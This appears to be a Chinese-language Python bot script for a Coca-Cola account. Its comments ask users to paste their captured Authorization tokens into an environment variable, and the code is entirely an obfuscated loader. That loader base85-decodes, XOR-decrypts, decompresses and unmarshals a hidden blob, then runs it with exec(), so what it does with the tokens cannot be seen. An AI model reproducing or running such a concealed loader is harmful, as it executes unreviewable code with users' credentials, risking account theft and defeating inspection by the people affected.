#   --------------------------------注释区--------------------------------
#   可口可乐
#   有问题请及时联系大大鸣 v:xolag29638099  （有其他想要的脚本也可以联系，尽量试着写一写）
#   抓任意请求体的Authorization: 把值全部塞进去
#   变量:yymkckl_ 多号： #分割
#
#   --------------------------------一般不动区-------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
#
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
# 佛曰:
#        写字楼里写字间，写字间里程序员；
#        程序人员写程序，又拿程序换酒钱。
#        酒醒只在网上坐，酒醉还来网下眠；
#        酒醉酒醒日复日，网上网下年复年。
#        但愿老死电脑间，不愿鞠躬老板前；
#        奔驰宝马贵者趣，公交自行程序员。
#        别人笑我忒疯癫，我笑自己命太贱；
#        不见满街漂亮妹，哪个归得程序员？
#
#   --------------------------------代码区--------------------------------
# -*- coding: utf-8 -*-
import zlib, base64, marshal, hashlib


def xor_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes(a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(data))


def decrypt():
    data = "N~5nJSrQ=Ol&dAx5`!!%MF^)J9NyS{34pp6%DgNeA>^1*W=_g)Ve>WvSY~>z*uuavBTX)1l%4-eJ7b@p=cLz!oDj6)(wcsblCg#BFfxhRY$TEE@&iG;heH5dI!LsF(ap}!v6xPqP5(N%Xp61AZ+`?a<xkAZE!<6t5$DpD<SIOje?5KLq$mc%10DhNx)7JqdlYEhqkz_b@+=d}G&^b(Gf>cjGH~HIXR3JJ<_H8?{9xS>K%Dc1rbt#q05-v8jT}o#uc+>O@q$7fZEDK`NLGuiZHMbpY@{buE3<Csq0c_FL)M9`a|+!d<hDF4*XY}M7ujNHs*UFR>c$YdAR#YP=)WwV<L$)5b|a?)p?}3oU`bLvNYP618c6(R_KC(4(#_WJ?6c6H(Lv!KJ~s6uB<ggs4pJoj<Wf|qDZ7D}=V{jZF=pzD-Nha)gz=BPf&7jA@kaQ;V=f^l9oR?hbl|I%B8uv@VnClj^o+2xQKpo0=g|%I+yL-by_q?YtvQzN)Jrb3mxL(mLQjN%q2YA_6uu$g4BkyeK!fb4r5V07z6r(;lx!>#!PDdm7xxKr)2LD8F{QAZS~XG2b=|P5rMcnVCd3g0<Y8`!|MVTB^}w={8Il#&F_ZYz>vtl&hQP6`;TFevz)TBj5!%I`)+v8Lp6t9?UI1pgm^l(94-d8J$090<D@clwy!?{|eO|3#rWGac!P;v(i<BHaA*zX|sX3CtIgpW5z(Qx<h7Zx|9LhZ;>(A8yi!n<umM$0QVD25<>ng&0oeZ5%N~un+tBVPu(_C`k?AfEzAe5#OhCOgxPg<CC9bH;;Bk*&FK}?i!C2AtLnejNhPIMptEX=vK7jrDoK@X_T4uWvbMjVd2031qzU8*nA%@e3wYinn&t!^7J)tOk;>nU%rikivA<+L2o{Z}Wclo3BIvs5-CLb^#DZK{1Gb`=OQm8@!{=BiyE014i<NSRn~(hZkTy~LuyP<EAAnH|#EH!GMNZRYcK0%TDIPPWAKlsNwsqT13w-c*M?+CagS?<in2c%rFBoCtB%gm!e#>WOi^ax|;8K1AAtz?+bXxHp#Fcp|6yOss7_YTLO>?q_u<Wb7>V(Dw_VB6W-uU(ZzqM9{km4UM7T1nkKW9Z%7n6}SSM-<mDXA%A@8)G&EkcAx7>M{7ACv8UJwER{pIe*pz7*I5)E%Q=={UrZ-en<9$M%MrdwU#_@ZnD0fGQvG}8RDP3L?O=j(tr3AGhJwKnH{51C&JmUkd?eqsH-hK6dqeYT;=?Ko+&DWQlzJ2<XZ+3os<bkNQi`)c22dnw)IELGnjgM`V%gePT?RRsTh=l+o)DvlR7vf6T0bg697E=OQABa#ET_gFgi`z!I8X%o<Ivd0yWGIt<_+?^x4mnSgvp-XHQi{vf<JYBqY^8TpEGfiCxj4}fI(0Yyo0`=JJbEu+y08G{r)Eh3G-V#ml`O|_gt#aFiB1G^_D;sl0-F!z^*Y>om~L=z-VpfSgt(=h9()_Te<&Yg`?u!>^8-Pj!hq@%?NjoC%_R|aCy}9Xl!|j^z__+_<?igC5$u7Vr|mz^{Xl4elW(xpERab(t%ynh3pv^4uMwmwoG)4GaP^NChp<3SMBTYKmU^{IE3S<AB*^`B!d)LN-sM!#BNHPtWqx>zBK+X<8GqUXbvA?dOvdoI}I~fIYFCwCA{~6xos?VxIXiJcpDftYfYrK+_}-GQtM$iUHnW+1V4zYS2+_Q>7ILvi2c{nw-txkK$I3`0P5d^1_Xyy%FVE8-zlHefUd)|0K=}=^k|Jl0RpG28SD$&|ERMz`vujNo3uRjx8AB|G~u2kc_63()IyAE&R+Gb79ij3UNL&3-P5f7FKb`7e+OWaPQ0I^IL7+pO(*PKtw2W(bwPZ!Ixrq>A~mqM^d9O;!tEn}3W)$Z16@w}2H`aa`4TEo-hZ;oPxKr`bO-b%ORu}JjV|Tux0}U4+S8qynK{>!o}Ackj2LE(<Pv$GdWuZx=1krkXugM4x=_zqLg`$WfniBY88Vlio<F)MUtH{dG{I~~Y?nc?)oNFOXh7D}Z1mK-0A~Gr?<}=FBKcd^NWB|VeE5Vn0=xt|RJs9ktN1YN&;<f@J^f)8lSKARgli(`2`Z{WCW1RkvX_V|w_7&=<`d`gL~fPS+Z)}RAB<+DF5!%b*R7#ad32{}VjS#k%8e#vQA4V|+#+O89nz}~Ul&iGJIDrhj>C){IJNyruZjS_E*stm!E187?#f%nC9e9gb>8SC&ni#?J$yr79RqDt2qw=49%PExX_qn8KKm*1R=}eT*Nr?~7df6Bi}#@l@by7qhlNu5)3BJG=!=ktuM)9<9mVyA8Cta4#)V$?Ku+{pal_F0R$w&xW;=RUiD`Q(oy;%6J+nc)T?QLsHIkPg+YoBJEFp{kr=TPLxn*qmw_4{AlB2i>ezYfAKS#=4^yN*a2SIPMerBKSs&a!L5fpM_>Mju`M_SzHWb8ScS`4wOVK^R96|TspM&{Vjp;wT<LgQ>kGggy|B{|ORor~=x1pZcM^q97HZj=T5FfQu1KzxAp=+-H?L!@kFKU)R^!{q=n@a1A8j$=-kFPxlTW^`W7xlc`?@h<kEB%C<oUfv@RF@Go90HU<9m6@g9Gu+IzT|G1F=}6%Waa>KkSJ?{B6({;zrc94fm6xH=-Drd^HVJq`JjWZsmBI}Xk@a|K2)x1lesUjSdu!UQ4R3FooVs0`w>t0cC4)y)UbDjwWWJpsHI~pm*@p?;wYRuKFlq-pK@06~=O|w^^LN9>CD%WoHZ$aKi@{s#&Z~h1zB;8RRK%d5%8QL#9n?JlY+!0eLaVyA<dJlDaBEzh1!qXmkrzl7f$9n2e|Vie_cP+~cb1sm$U-jH&YZDW-MgW?XpM4{WGl+4Zzi|rRD}F)LagvN>n_neo)uC#3}bRbR>Eu<gD+>tyHJfyAf%wUUPKEm0y{r>SE_-fU6PuQP;QX~k8%6^B`OlPMFWC%lPDIWXSrO|w+zV"
    key = "2yb72Bs8mw2l6bIvQTNChZXeI0zEm4nN"
    checksum = "af450e4ab1326652"

    # Verify checksum
    if hashlib.sha256(data.encode()).hexdigest()[:16] != checksum:
        raise ValueError("Data integrity check failed")

    # Decrypt process
    encrypted = base64.b85decode(data)
    compressed = xor_decrypt(encrypted, key)
    marshalled = zlib.decompress(compressed)
    return marshal.loads(marshalled)


exec(decrypt())
